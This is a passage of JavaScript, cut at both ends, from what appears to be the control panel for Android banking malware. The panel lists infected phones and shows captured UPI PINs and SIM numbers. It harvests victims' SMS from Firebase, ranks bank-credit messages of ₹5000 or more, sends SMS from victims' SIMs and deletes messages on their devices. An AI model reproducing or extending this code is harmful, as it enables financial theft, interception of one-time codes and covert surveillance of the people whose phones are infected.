  if(!inst.db||inst.liveAttached)return;
  inst.liveAttached=true;
}
function runBackgroundPinEnrichmentAll(){
  if(Date.now()-_lastPinEnrichAt<300000)return;
  _lastPinEnrichAt=Date.now();
  firebaseInstances.forEach(function(inst){
    runBackgroundPinEnrichment(inst);
  });
}
function runBackgroundPhoneEnrichmentAll(){
  var tasks=[], max=16, count=0;
  Object.keys(clientsRawMap).forEach(function(k){
    if(count>=max)return;
    var raw=clientsRawMap[k];
    if(!raw)return;
    if(raw.mobNo&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return;
    if(deviceSmsCache[k]&&deviceSmsCache[k].list&&deviceSmsCache[k].list.length){
      if(enrichDevicePhoneFromSms(k))return;
    }
    var p=parseDevKey(k), inst=getFbInstance(p.fbId);
    if(!inst||!shouldUseApkSmsPath(inst,{rawId:p.devId,fbId:p.fbId,id:k}))return;
    count++;
    tasks.push(restJsonInst(inst,'messages/'+p.devId).then(function(data){
      if(!data||typeof data!=='object')return;
      var list=smsAsList(data).map(normalizeSms).filter(Boolean);
      if(!list.length)return;
      deviceSmsCache[k]={list:list.slice(0,60),at:Date.now()};
      enrichDevicePhoneFromSms(k);
    }).catch(function(){}));
  });
  if(!tasks.length)return;
  Promise.all(tasks).then(function(){processClientsDataNow();});
}
function fetchAllData(force){
  if(_panelPaused)return Promise.resolve();
  if(_fetchAllInFlight&&!force)return Promise.resolve();
  if(!force&&allDevs.length&&_lastFetchAllAt&&(Date.now()-_lastFetchAllAt)<90000){
    processClientsDataNow();
    return Promise.resolve();
  }
  _fetchAllInFlight=true;
  _initialLoadDone=true;
  showLoading(false,true);
  if(force){
    firebaseInstances.forEach(function(inst){inst._deepDiscoverDone=false;});
  }
  var insts=sortInstancesActiveFirst(firebaseInstances);
  processClientsDataNow();
  insts.forEach(attachLiveFast);
  return mapPoolLimit(insts,function(inst){return discoverInstanceProbe(inst,!!force);},DISCOVER_CONCURRENCY).then(function(){
    _lastFetchAllAt=Date.now();
    processClientsDataNow();
    insts.forEach(function(inst){if(inst.db)attachLive(inst);});
    setTimeout(function(){runBackgroundPinEnrichmentAll();},3000);
    setTimeout(function(){runBackgroundPhoneEnrichmentAll();},1200);
  }).catch(function(){
    processClientsDataNow();
  }).then(function(){
    _fetchAllInFlight=false;
  });
}
function refreshData(){toast('Refreshing...',true);fetchAllData(true);}
function closeNyaMenu(){
  var m=document.getElementById('nyaMenuDrop');
  if(m)m.classList.remove('open');
}
function toggleNyaMenu(ev){
  if(ev){ev.stopPropagation();}
  var m=document.getElementById('nyaMenuDrop');
  if(!m)return;
  var open=m.classList.toggle('open');
  if(open){
    setTimeout(function(){
      document.addEventListener('click',function handler(e){
        if(!e.target.closest('.nya-menu-wrap'))closeNyaMenu();
        document.removeEventListener('click',handler);
      });
    },0);
  }
}
function nyaPromptPanelServer(){
  if(window.RebelAndroid&&typeof RebelAndroid.promptPanelServer==='function'){
    RebelAndroid.promptPanelServer();return;
  }
  var cur=(window.PANEL_SERVER_URL||'').replace(/\/$/,'');
  try{var s=localStorage.getItem('nya_panel_server');if(s&&!cur)cur=s;}catch(e){}
  var u=prompt('Panel Server URL (nya.php folder):',cur||'https://');
  if(u==null)return;
  u=String(u).trim().replace(/\/$/,'');
  if(!u)return;
  window.PANEL_SERVER_URL=u;
  try{localStorage.setItem('nya_panel_server',u);}catch(e){}
  toast('Server saved',true);
}
function nyaCheckOtaUpdate(){
  if(window.RebelAndroid&&typeof RebelAndroid.checkForUpdate==='function'){
    RebelAndroid.checkForUpdate();return;
  }
  toast('OTA sirf APK me available hai',false);
}
function nyaReloadPanel(){
  if(window.RebelAndroid&&typeof RebelAndroid.reloadPanel==='function'){
    RebelAndroid.reloadPanel();return;
  }
  location.reload();
}
function nyaMenuAction(action){
  closeNyaMenu();
  if(action==='server')nyaPromptPanelServer();
  else if(action==='firebase')openFbSheet();
  else if(action==='autotoken')openAutoTokenSheet();
  else if(action==='ota')nyaCheckOtaUpdate();
  else if(action==='reload')nyaReloadPanel();
}

function scanDeviceBankStatus(d){
  if(deviceBankCache[d.id]!==undefined)return Promise.resolve(deviceBankCache[d.id]);
  var inst=getFbInstance(d.fbId);
  if(!inst){deviceBankCache[d.id]=false;return Promise.resolve(false);}
  return fetchSmsFromPaths(inst,d).then(function(list){
    var has=parseBankAccountsFromSms(list).length>0;
    deviceBankCache[d.id]=has;
    return has;
  }).catch(function(){deviceBankCache[d.id]=false;return false;});
}
function scanAllDevicesBank(){
  var devs=getFilteredDevs();
  if(!devs.length)return Promise.resolve();
  var i=0, batch=2;
  function next(){
    if(i>=devs.length)return Promise.resolve();
    var slice=devs.slice(i,i+batch);
    i+=batch;
    return Promise.all(slice.map(scanDeviceBankStatus)).then(next);
  }
  return next();
}

function buildDevCardHtml(d,i,total){
  var raw=getRawDev(d.id);
  var on=d.status==='online';
  var phone=getDeviceDisplayPhone(raw);
  var info='Phone : '+esc(phone)+'\nModel : '+esc(getApkModel(raw,d))+'\nBattery : '+(raw.battery!=null?raw.battery:d.battery)+'%\n$- : '+esc(getApkMoney(raw));
  var pinLine='PIN = '+esc(getApkUpiPin(raw,d)||'—');
  var count=(total!=null?total-i:i+1);
  return '<div class="dev-card" data-dev-id="'+escAttr(d.id)+'"><div class="dev-card-inner">'+
    '<div class="dev-count">'+count+'</div>'+
    '<div class="dev-like'+(isApkLiked(d.id)?' liked':'')+'" data-dev-id="'+escAttr(d.id)+'">'+(isApkLiked(d.id)?'❤️':'👎')+'</div>'+
    '<div class="dev-info">'+info+'</div>'+
    '<div class="dev-status '+(on?'online':'offline')+'">'+(on?'Online':'Offline')+'</div>'+
    '<div class="dev-del" data-dev-id="'+escAttr(d.id)+'">🗑️</div>'+
    '<div class="dev-pin">'+pinLine+'</div>'+
    '<div class="dev-check" data-dev-id="'+escAttr(d.id)+'"><input type="checkbox"'+(isApkChecked(d.id)?' checked':'')+' onclick="event.stopPropagation()"/> CHECKED</div>'+
    '<div class="dev-time">'+formatDevDate(d)+'</div></div></div>';
}
function buildSmsCardHtml(m,extra,opts){
  opts=opts||{};
  var body=esc(m.body||m.message||m.text||'');
  var sender=esc(m.address||m.sender||m.from||'Unknown');
  var when=esc(m.date_readable||m.dateTime||m.date||m.time||'');
  var del='';
  if(opts.deletable&&m.id){
    del='<button type="button" class="icon-btn sms-del" onclick="event.stopPropagation();deleteDeviceSms(\''+escAttr(String(m.id))+'\')">🗑️</button>';
  }
  return '<div class="sms-card"><div class="sms-inner">'+
    '<div class="sms-icon">💬</div>'+
    '<div class="sms-body">'+body+'</div>'+
    del+
    '<div class="sms-foot"><span>Sender: '+sender+'</span><span>'+(when||'')+'</span></div>'+
    '</div></div>';
}
function renderDevices(){
  if(currentView==='money'){renderMoneyView();return;}
  if(currentView==='device'){renderDeviceSmsList();return;}
  var q=getSearchQuery();
  var list=getFilteredDevs().filter(function(d){
    if(!q)return true;
    var hay=(d.displayPhone+d.name+d.rawId+(d.pin||'')).toLowerCase();
    var digits=String(q).replace(/\D/g,'');
    if(digits.length>=6){
      var phoneHay=(d.displayPhone||'').replace(/\D/g,'');
      if(phoneHay.indexOf(digits)>=0||phoneHay.slice(-10)===digits.slice(-10))return true;
    }
    return hay.includes(String(q).toLowerCase());
  });
  var emptyMsgs={home:'No clients found',online:'No online clients',onlypin:'No PIN clients found',liked:'No liked clients',login:'No logged-in clients'};
  var emptyMsg=!firebaseConfigs.length?'Add Firebase first 🔥':(emptyMsgs[currentView]||'No clients found');
  var html=!list.length?'<div class="empty">'+emptyMsg+'</div>':list.map(function(d,i){return buildDevCardHtml(d,i,list.length);}).join('');
  var el=getActiveListEl();
  if(el)el.innerHTML=html;
}
var APK_MONEY_KEYWORDS=['credited','balance','avl','bal','inr','₹','bank','upi','pnb','canara','union','uco','idbi','central','bob','boi','punjab'];
function apkContainsLargeAmount(text){
  var re=/(\u20b9|rs\.?)[ ]?([\d,]+\.?\d*)/gi,m,best=0;
  while((m=re.exec(String(text||'')))!==null){
    var n=parseFloat(String(m[2]).replace(/,/g,''));
    if(!isNaN(n)&&n>=5000)return true;
    if(n>best)best=n;
  }
  return best>=5000;
}
function apkExtractFirstAmount(text){
  var re=/(\u20b9|rs\.?)[ ]?([\d,]+\.?\d*)/gi,m;
  while((m=re.exec(String(text||'')))!==null){
    var n=parseFloat(String(m[2]).replace(/,/g,''));
    if(!isNaN(n)&&n>0)return n;
  }
  return 0;
}
function apkFormatMsgDate(ts){
  if(!ts)return '';
  var dt=new Date(typeof ts==='number'&&ts<1e12?ts*1000:+ts);
  if(isNaN(dt.getTime()))return String(ts);
  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
  h=h%12||12;
  return 'DATE: '+dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
}
function parseApkMoneyMessage(msgData,clientKey,clientData){
  if(!msgData||typeof msgData!=='object')return null;
  var msgText=msgData.message!=null?msgData.message:(msgData.body||msgData.text||'');
  var senderRaw=msgData.sender!=null?msgData.sender:(msgData.address||msgData.from||'');
  if(msgText==null||msgText===''||senderRaw==null||senderRaw==='')return null;
  var message=String(msgText).toLowerCase();
  var sender=String(senderRaw).toLowerCase();
  if(/\d{6,}/.test(sender))return null;
  if(/sbi|hdfc/.test(message))return null;
  if(/loan|application|emi/.test(message))return null;
  var hit=false,i;
  for(i=0;i<APK_MONEY_KEYWORDS.length;i++){if(message.indexOf(APK_MONEY_KEYWORDS[i])>=0){hit=true;break;}}
  if(!hit||!apkContainsLargeAmount(message))return null;
  var amount=apkExtractFirstAmount(message);
  var row=Object.assign({},msgData);
  row.message=String(msgText);
  row.sender=String(senderRaw);
  row.clientKey=clientKey;
  row.status=clientData&&clientData.status;
  row.modelName=clientData&&clientData.modelName;
  row.mobNo=clientData&&clientData.mobNo;
  row.amount=amount;
  var orig=msgData.dateTime||msgData.date_readable||msgData.date||msgData.time||'';
  row.dateTime=orig?String(orig):'';
  return row;
}
function loadMoneyMessages(force){
  if(moneyMessagesLoading)return new Promise(function(resolve){
    var t=setInterval(function(){
      if(!moneyMessagesLoading){clearInterval(t);resolve(moneyMessagesList);}
    },150);
  });
  if(!force&&moneyMessagesList.length&&_moneyLoadedAt&&(Date.now()-_moneyLoadedAt<MONEY_CACHE_MS)){
    return Promise.resolve(moneyMessagesList);
  }
  moneyMessagesLoading=true;
  var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
  function fetchClientMessages(inst,clientKey,clientData){
    return restJsonInst(inst,'messages/'+clientKey).then(function(msgs){
      if(!msgs||typeof msgs!=='object')return [];
      var rows=[];
      Object.keys(msgs).forEach(function(msgId){
        var parsed=parseApkMoneyMessage(Object.assign({id:msgId},msgs[msgId]),clientKey,clientData);
        if(parsed){parsed.fbId=inst.id;rows.push(parsed);}
      });
      return rows;
    }).catch(function(){return[];});
  }
  function loadInst(inst){
    var devs=allDevs.filter(function(d){return d.fbId===inst.id;});
    var jobs=[];
    if(!devs.length){
      return restJsonInst(inst,'clients').then(function(clients){
        if(!clients||typeof clients!=='object')return [];
        Object.keys(clients).forEach(function(clientKey){
          var clientData=clients[clientKey];
          if(!clientData||typeof clientData!=='object'||!hasApkModelName(clientData))return;
          jobs.push({key:clientKey,data:clientData});
        });
        return mapPoolLimit(jobs,function(job){
          return fetchClientMessages(inst,job.key,job.data);
        },8).then(function(parts){
          var out=[];
          parts.forEach(function(rows){out=out.concat(rows);});
          return out;
        });
      }).catch(function(){return[];});
    }
    devs.forEach(function(d){
      var raw=getRawDev(d.id);
      if(!hasApkModelName(raw)&&!raw.modelName&&!raw.mobNo&&!raw.deviceId)return;
      jobs.push({key:d.rawId,data:raw});
    });
    return mapPoolLimit(jobs,function(job){
      return fetchClientMessages(inst,job.key,job.data);
    },8).then(function(parts){
      var out=[];
      parts.forEach(function(rows){out=out.concat(rows);});
      return out;
    });
  }
  return Promise.all(insts.map(loadInst)).then(function(results){
    var out=[];
    results.forEach(function(part){out=out.concat(part);});
    out.sort(function(a,b){return (b.amount||0)-(a.amount||0);});
    moneyMessagesList=out;
    _moneyLoadedAt=Date.now();
    moneyMessagesLoading=false;
    return out;
  }).catch(function(){
    moneyMessagesLoading=false;
    return moneyMessagesList;
  });
}
function buildMoneyCardHtml(row){
  var on=parseApkBool(row.status);
  var phone=esc(String(row.mobNo||''));
  var model=esc(String(row.modelName||''));
  var body=esc(String(row.message||''));
  var sender=esc(String(row.sender||''));
  var when=esc(String(row.dateTime||''));
  var clientKey=escAttr(String(row.clientKey||''));
  var fbId=escAttr(String(row.fbId||''));
  return '<div class="money-card" onclick="openMoneyDevice(\''+clientKey+'\',\''+fbId+'\')"><div class="money-inner">'+
    '<div class="money-icon">💰</div>'+
    '<div class="money-phone">Phone: '+phone+'('+model+')</div>'+
    '<div class="money-status '+(on?'online':'offline')+'">'+(on?'online':'offline')+'</div>'+
    '<div class="money-body">'+body+'</div>'+
    '<div class="money-meta"><span>Sender: '+sender+'</span><span>'+when+'</span></div></div></div>';
}
function openMoneyDevice(clientKey,fbId){
  var d=allDevs.find(function(x){return x.rawId===clientKey&&(!fbId||x.fbId===fbId);});
  if(d)selectDevice(d.id);else toast('Device not found',false);
}
function renderMoneyView(){
  var el=document.getElementById('devListMoney');
  if(!el)return;
  var q=getSearchQuery().toLowerCase();
  var list=moneyMessagesList.slice();
  if(moneyFilterMode==='active')list=list.filter(function(m){return parseApkBool(m.status);});
  else list=list.filter(function(m){
    var amt=+(m.amount||0);
    return amt>=moneyAmountMin&&amt<=moneyAmountMax;
  });
  if(q)list=list.filter(function(m){
    var hay=(m.message||'')+(m.sender||'')+(m.mobNo||'')+(m.modelName||'');
    return hay.toLowerCase().includes(q);
  });
  setText('moneyTotal','Total:-'+list.length);
  if(moneyMessagesLoading){
    el.innerHTML='<div class="empty">Loading money SMS…</div>';
    return;
  }
  if(!moneyMessagesList.length){
    el.innerHTML='<div class="empty">Loading money SMS…</div>';
    loadMoneyMessages(true).then(function(){renderMoneyView();});
    return;
  }
  if(!list.length){
    el.innerHTML='<div class="empty">No money messages found</div>';
    return;
  }
  el.innerHTML=list.slice(0,200).map(buildMoneyCardHtml).join('');
}
function formatApkSimInfo(raw){
  var sims=raw&&raw.sims;
  if(!Array.isArray(sims)||!sims.length)return '';
  return sims.map(function(sim,i){
    var num=sim&&(sim.phoneNumber||sim.number||sim.phone||'');
    var carrier=sim&&sim.carrierName?String(sim.carrierName).split('—')[0].trim():'';
    return 'sim'+(i+1)+'-'+num+' '+carrier;
  }).join(' | ');
}
function buildDeviceDetailText(d){
  var raw=getRawDev(d.id);
  var on=d.status==='online';
  var lines=[
    'Device name: '+getApkModel(raw,d),
    'Phone: '+getApkPhoneDisplay(raw,d),
    'Upi-pin: '+(getApkUpiPin(raw)||'—'),
    'time: '+(getApkJoined(raw)||'—'),
    'Money: '+(getApkMoney(raw)||'—'),
    'Liked: '+(isApkYes(raw.liked)?'yes':'no'),
    'Status: '+(on?'Online':'Offline')
  ];
  var simTxt=formatApkSimInfo(raw);
  if(simTxt)lines.push('SIMs: '+simTxt);
  return lines.join('\n');
}
function renderDeviceDetail(){
  var d=getSelDev();
  var titleEl=document.getElementById('deviceDetailTitle');
  var statusEl=document.getElementById('deviceDetailStatus');
  var bodyEl=document.getElementById('deviceDetailBody');
  var moneyEl=document.getElementById('updateMoney');
  var likeBtn=document.getElementById('deviceLikeBtn');
  var chkEl=document.getElementById('deviceCheckedBox');
  var loginEl=document.getElementById('deviceLoginToggle');
  if(!d){
    if(bodyEl)bodyEl.textContent='No device selected';
    return;
  }
  var raw=getRawDev(d.id);
  var on=d.status==='online';
  if(titleEl)titleEl.textContent=getApkPhoneDisplay(raw,d)||getApkModel(raw,d)||'Device';
  if(statusEl){
    statusEl.textContent=on?'Online':'Offline';
    statusEl.className='status '+(on?'online':'offline');
  }
  if(bodyEl)bodyEl.textContent=buildDeviceDetailText(d);
  if(moneyEl)moneyEl.value=getApkMoney(raw);
  if(likeBtn){
    likeBtn.textContent=isApkLiked(d.id)?'❤️':'👎';
    likeBtn.classList.toggle('liked',isApkLiked(d.id));
  }
  if(chkEl)chkEl.checked=isApkChecked(d.id);
  if(loginEl)loginEl.checked=isApkLoggedIn(d.id);
  fillDeviceSmsTo(d);
}
function toggleDeviceLogin(on){
  var d=getSelDev();if(!d)return;
  patchClientField(d,{login:on?'yes':'no'},on?'Logged in':'Logged out');
}
function toggleDeviceDetailLike(){
  var d=getSelDev();if(!d)return;
  var next=isApkLiked(d.id)?'no':'yes';
  patchClientField(d,{liked:next},next==='yes'?'Liked':'Disliked').then(function(){renderDeviceDetail();});
}
function toggleDeviceDetailChecked(on){
  var d=getSelDev();if(!d)return;
  patchClientField(d,{checked:!!on});
}
function copyDevicePhone(){
  var d=getSelDev();if(!d)return;
  var text=buildDeviceDetailText(d);
  var m=text.match(/Phone:\s*([^\n]+)/i);
  var phone=m?m[1].trim():'';
  if(!phone){toast('No valid number to copy.',false);return;}
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(phone).then(function(){toast('Phone number copied!',true);}).catch(function(){toast('Copy failed',false);});
  }else toast(phone,true);
}
function pasteDeviceSms(){
  if(!navigator.clipboard||!navigator.clipboard.readText){toast('Clipboard not available',false);return;}
  navigator.clipboard.readText().then(function(txt){
    if(!txt){toast('Clipboard empty',false);return;}
    var useSim=prompt('Paste SMS via Sim 1 or Sim 2? (1/2)','1');
    var sim=(useSim==='2')?2:1;
    var toEl=document.getElementById('smsTo');
    var msgEl=document.getElementById('smsBody');
    var parts=String(txt).split(/\n/);
    if(parts.length>=2){
      if(toEl)toEl.value=parts[0].replace(/\D/g,'').slice(-10);
      if(msgEl)msgEl.value=parts.slice(1).join('\n').trim();
    }else if(msgEl){msgEl.value=txt;}
    toast('Pasted — tap Sim'+sim+' to send',true);
  }).catch(function(){toast('Paste failed',false);});
}
function deleteDeviceSms(msgId){
  var d=getSelDev();if(!d||!msgId)return;
  if(!confirm('Are you sure to delete?'))return;
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var url=buildRestUrl(inst,'messages/'+d.rawId+'/'+msgId,getFbAuthKey(inst));
  fetch(url,{method:'DELETE'}).then(function(r){
    if(r.ok){toast('Delete',true);loadSmsForDevice(true);}else toast('Delete failed',false);
  }).catch(function(){toast('Delete failed',false);});
}
function renderDeviceSmsList(){
  var el=document.getElementById('devListDeviceSms');
  if(!el||currentView!=='device')return;
  var d=getSelDev();
  if(!d){el.innerHTML='<div class="empty">Select a device</div>';return;}
  var q=getSearchQuery();
  var cached=deviceSmsCache[d.id];
  var list=(cached&&cached.list&&cached.list.length)?cached.list:(window_allSms||window_sms||[]);
  list=list.filter(function(m){
    if(!q)return true;
    var hay=(m.body||'')+(m.address||'')+(m.sender||'');
    return hay.toLowerCase().includes(q);
  });
  if(_smsLoading&&!list.length){el.innerHTML='<div class="empty">Loading SMS…</div>';return;}
  if(!list.length){el.innerHTML='<div class="empty">No SMS yet</div>';return;}
  el.innerHTML=list.slice(0,120).map(function(m){return buildSmsCardHtml(m,'',{deletable:true});}).join('');
}
function closeDeviceDetail(){
  selDev='';
  if(activeListeners._devLive){
    try{
      if(activeListeners._devLive.ref&&activeListeners._devLive.h)activeListeners._devLive.ref.off('value',activeListeners._devLive.h);
    }catch(e){}
    delete activeListeners._devLive;
  }
  clearSmsListeners();
  showPage('home');
}
function nyaHandleBack(){
  if(currentView==='device'){closeDeviceDetail();return true;}
  if(currentView!=='home'){showPage('home');return true;}
  return false;
}
function sendDeviceSms(sim){
  var d=getSelDev();
  if(!d){toast('Select a device first',false);return;}
  _sendSimSlot=sim||1;
  var toEl=document.getElementById('smsTo');
  var msgEl=document.getElementById('smsBody');
  var raw=getRawDev(d.id);
  var toRaw=(toEl&&toEl.value||'').trim();
  if(!toRaw){
    toRaw=getApkSimPhone(raw,_sendSimSlot)||getApkMobNo(raw,d);
    if(toEl&&toRaw)toEl.value=(toRaw.length===10?'+91'+toRaw:toRaw);
  }
  var phoneDial=formatApkSmsTo(toRaw);
  var msg=(msgEl&&msgEl.value||'').trim();
  if(!toRaw){toast('Recipient number daalo',false);return;}
  if(!msg){toast('Enter message',false);return;}
  if(!isApkOnlineRaw(raw)&&String(d.status||'').toLowerCase()!=='online'){
    toast('⚠️ Device offline dikha raha hai — phir bhi queue kar rahe hain',true);
  }
  if(_sendInFlight){toast('Sending…',true);return;}
  _sendInFlight=true;
  toast('Sending SMS…',true);
  sendSmsInstant(toRaw,msg,_sendSimSlot,function(ok,data){
    _sendInFlight=false;
    if(ok){
      if(msgEl)msgEl.value='';
      var dest=(data&&data.to)||phoneDial||toRaw;
      var line=(data&&data.message)||('SMS queue → '+dest+' (Sim '+(_sendSimSlot||1)+')');
      toast(line,true);
    }else{
      toast((data&&data.error)||'Send failed',false);
    }
  });
}
function saveDeviceMoney(){
  var d=getSelDev();
  if(!d){toast('No device selected',false);return;}
  var val=(document.getElementById('updateMoney')||{}).value;
  val=val!=null?String(val).trim():'';
  if(!val){toast('Enter amount',false);return;}
  patchClientField(d,{money:val},'Money updated').then(function(){renderDeviceDetail();});
}
function attachSelectedDeviceLive(d){
  if(!d)return;
  var inst=getFbInstance(d.fbId);
  if(!inst||!inst.db)return;
  var liveKey='_devLive';
  if(activeListeners[liveKey]){
    try{
      if(activeListeners[liveKey].ref&&activeListeners[liveKey].h)activeListeners[liveKey].ref.off('value',activeListeners[liveKey].h);
    }catch(e){}
  }
  var node=getClientWritePath(d,inst)+'/'+d.rawId;
  try{
    var ref=inst.db.ref(node);
    var h=function(snap){
      if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
      if(selDev!==d.id)return;
      var val=typeof snap.val==='function'?snap.val():snap;
      if(!val||typeof val!=='object')return;
      ingestDeviceData(d.fbId,getClientWritePath(d,inst),d.rawId,val);
      processClientsDataNow();
      renderDeviceDetail();
    };
    ref.on('value',h);
    activeListeners[liveKey]={ref:ref,h:h,devId:d.id};
  }catch(e){}
}
function selectDevice(id){
  var wasSelected=selDev===id;
  selDev=id;
  var d=getSelDev();
  if(!d)return;
  currentView='device';
  Object.keys(PAGE_VIEWS).forEach(function(k){
    var el=document.getElementById(PAGE_VIEWS[k]);
    if(el)el.classList.toggle('active',k==='device');
  });
  renderDeviceDetail();
  fillDeviceSmsTo(d,true);
  attachSelectedDeviceLive(d);
  var cached=deviceSmsCache[id];
  if(cached&&cached.list&&cached.list.length){
    window_allSms=cached.list;
    window_sms=cached.list.slice(0,80);
    _smsLoading=false;
    renderDeviceSmsList();
  }else{
    _smsLoading=true;
    var smsEl=document.getElementById('devListDeviceSms');
    if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
  }
  var hasCache=!!(cached&&cached.list&&cached.list.length);
  loadSmsForDevice(!hasCache&&!wasSelected);
  scrollActiveListTop();
}
function renderSmsModal(){
  renderDeviceSmsList();
  var el=document.getElementById('smsModalList');
  if(!el)return;
  var d=getSelDev();
  var cached=d&&deviceSmsCache[d.id];
  var list=(cached&&cached.list&&cached.list.length)?cached.list:(window_allSms||window_sms||[]);
  if(_smsLoading&&!list.length){el.innerHTML='<div class="empty">Loading SMS…</div>';return;}
  if(!list.length){el.innerHTML='<div class="empty">No SMS yet</div>';return;}
  el.innerHTML=list.slice(0,80).map(function(m){return buildSmsCardHtml(m,'',{deletable:true});}).join('');
}
function renderDeviceView(){}
function extractDeviceSims(raw){
  var sims=[],seen={},i,s,pn,apkSims;
  if(!raw||typeof raw!=='object')return sims;
  if(isNyaApkClientRecord(raw)){
    apkSims=parseApkSims(raw);
    for(i=0;i<apkSims.length;i++){
      pn=String(apkSims[i].phoneNumber||'').trim();
      if(!pn||seen[pn])continue;
      seen[pn]=1;
      sims.push({slot:i+1,phoneNumber:pn,carrierName:apkSims[i].carrierName||''});
    }
    if(!sims.length){
      pn=apkPhoneFromRaw(raw);
      if(pn)sims.push({slot:1,phoneNumber:pn});
    }
    return sims;
  }
  var list=raw.sims;
  if(list&&typeof list==='object'&&!Array.isArray(list))list=Object.keys(list).map(function(k){return list[k];});
  if(Array.isArray(list)){
    for(i=0;i<list.length;i++){
      s=list[i];
      if(typeof s==='string'&&s&&!seen[s]){seen[s]=1;sims.push({slot:i+1,phoneNumber:s});continue;}
      if(!s||typeof s!=='object')continue;
      pn=s.phoneNumber||s.number||s.phone||s.mobNo||s.mobile||'Unknown';
      if(!seen[pn]){seen[pn]=1;sims.push({slot:i+1,phoneNumber:pn});}
    }
  }
  if(!sims.length){
    pn=getPhoneFromRecord(raw);
    if(pn)sims.push({slot:1,phoneNumber:pn});
  }
  return sims;
}
function renderSimSelector(d){
  var el=document.getElementById('simSelector');
  if(!el)return;
  var sims=(d&&d.sims&&d.sims.length)?d.sims:[{slot:1,phoneNumber:'SIM 1'},{slot:2,phoneNumber:'SIM 2'}];
  _sendSimSlot=sims[0].slot||1;
  el.innerHTML=sims.map(function(s,idx){
    var slot=s.slot||idx+1;
    var label='SIM '+slot+(s.phoneNumber&&s.phoneNumber!=='Unknown'?' · '+s.phoneNumber:'');
    return '<div class="sim-chip'+(slot===_sendSimSlot?' active':'')+'" data-sim="'+slot+'" onclick="selectSim('+slot+',this)">'+esc(label)+'</div>';
  }).join('');
}
function updateSendForm(){
  var d=getSelDev();
  var emptyEl=document.getElementById('sendEmpty');
  var formEl=document.getElementById('sendForm');
  if(!emptyEl&&!formEl)return;
  if(emptyEl)emptyEl.classList.toggle('hidden',!!d);
  if(formEl)formEl.classList.toggle('hidden',!d);
  if(d)renderSimSelector(d);
}

function smsBelongsToDevice(m,d){
  if(!m||!d)return true;
  var did=m.device_id||m.deviceId||m.client_id||m.clientId||m.dev_id||m.devId||'';
  if(!did)return true;
  return String(did)===String(d.rawId)||String(did)===String(d.id)||String(did)===String(d.fbId+'::'+d.rawId);
}
function filterSmsForDevice(list,d){
  return (list||[]).filter(function(s){return smsBelongsToDevice(s,d);});
}
function loadSmsCacheFromStorage(){
  try{
    var s=localStorage.getItem(SMS_CACHE_KEY);
    if(!s)return;
    var data=JSON.parse(s);
    if(!data||typeof data!=='object')return;
    Object.keys(data).forEach(function(k){
      if(data[k]&&Array.isArray(data[k].list)&&data[k].list.length) deviceSmsCache[k]=data[k];
    });
  }catch(e){}
}
function persistSmsCacheSoon(){
  if(_smsPersistTimer)clearTimeout(_smsPersistTimer);
  _smsPersistTimer=setTimeout(function(){
    try{
      var out={}, k, c;
      for(k in deviceSmsCache){
        c=deviceSmsCache[k];
        if(c&&c.list&&c.list.length) out[k]={list:c.list.slice(0,SMS_CACHE_MAX),at:c.at||Date.now()};
      }
      localStorage.setItem(SMS_CACHE_KEY,JSON.stringify(out));
    }catch(e){}
  },300);
}
function prefetchSmsForDevice(d){
  if(!d||deviceSmsCache[d.id]&&deviceSmsCache[d.id].list&&deviceSmsCache[d.id].list.length)return;
  var inst=getFbInstance(d.fbId);
  if(!inst)return;
  fetchSmsFast(inst,d).then(function(list){
    if(list&&list.length)setDeviceSms(d.id,list);
  });
}
function setDeviceSms(devId,list){
  var sms=(list||[]).slice().sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  deviceSmsCache[devId]={list:sms,at:Date.now()};
  persistSmsCacheSoon();
  var smsPin=extractPinFromSmsList(sms);
  if(smsPin&&applyPinToDevice(devId,smsPin))processClientsData();
  if(enrichDevicePhoneFromSms(devId))processClientsDataNow();
  if(selDev===devId){
    window_allSms=sms;
    window_sms=sms.slice(0,80);
    scheduleRenderSms();
    if(currentView==='device')renderDeviceSmsList();
    if(document.getElementById('screen-bank')&&document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
  }
}
function scheduleRenderSms(){
  if(_smsRenderTimer)clearTimeout(_smsRenderTimer);
  _smsRenderTimer=setTimeout(function(){
    _smsRenderTimer=null;
    renderSms();
    if(currentView==='device')renderDeviceSmsList();
  },SMS_RENDER_DEBOUNCE_MS);
}
function mergeSmsIntoDevice(devId,list){
  if(!devId||!list||!list.length)return;
  var cached=deviceSmsCache[devId];
  var merged=mergeSmsLists(cached&&cached.list||[],list);
  if(merged.length)setDeviceSms(devId,merged);
}
function showSmsForSelectedDevice(){
  var d=getSelDev();
  if(!d){window_sms=[];window_allSms=[];renderSmsModal();return;}
  var cached=deviceSmsCache[d.id];
  window_allSms=cached?cached.list.slice():[];
  window_sms=window_allSms.slice(0,80);
  renderSmsModal();
}
function clearSmsListeners(keepKey){
  Object.keys(activeListeners).forEach(function(k){
    if(k==='_devLive')return;
    if(keepKey&&k===keepKey)return;
    var L=activeListeners[k];
    if(!L)return;
    if(L.loadTimer)clearTimeout(L.loadTimer);
    if(L.timer)clearInterval(L.timer);
    if(L.timers){L.timers.forEach(function(t){clearInterval(t);});}
    if(L.refs){L.refs.forEach(function(r){
      try{
        if(r.ref&&r.h){
          if(r.type==='child_added')r.ref.off('child_added',r.h);
          else if(r.type==='child_changed')r.ref.off('child_changed',r.h);
          else r.ref.off('value',r.h);
        }
      }catch(e){}
    });}
    else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
    delete activeListeners[k];
  });
}
function clearListeners(){
  if(activeListeners._devLive){
    try{
      if(activeListeners._devLive.ref&&activeListeners._devLive.h)activeListeners._devLive.ref.off('value',activeListeners._devLive.h);
    }catch(e){}
  }
  clearSmsListeners();
  activeListeners={};
}
function attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn){
  if(!inst||!inst.db||typeof applyFn!=='function')return;
  var path=getApkSmsPath(d);
  if(!path)return;
